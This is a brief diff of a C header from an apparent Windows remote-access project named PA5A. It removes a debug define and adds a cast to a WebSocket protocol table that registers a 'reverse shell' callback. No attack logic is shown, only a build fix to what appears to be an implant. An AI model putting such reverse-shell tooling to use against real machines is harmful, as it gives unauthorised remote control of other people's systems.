@@ -32,8 +32,6 @@
 EXTERN_C_START
 
 /******************************CONFIGURATION******************************/
-//Pour afficher les informations de debogage
-#define DEBUG
 
 #define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
 #define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
@@ -277,7 +275,7 @@ BOOL WebSocketConnection();
 
 static struct lws_protocols protocols[] =
 {
-	{"pa5a_reversehell", reverse_shell_callback, 0, 0, 0, NULL, 0},
+	{"pa5a_reversehell", (lws_callback_function*)reverse_shell_callback, 0, 0, 0, NULL, 0},
 	{NULL, NULL, 0, 0, 0, NULL, 0}
 };
 
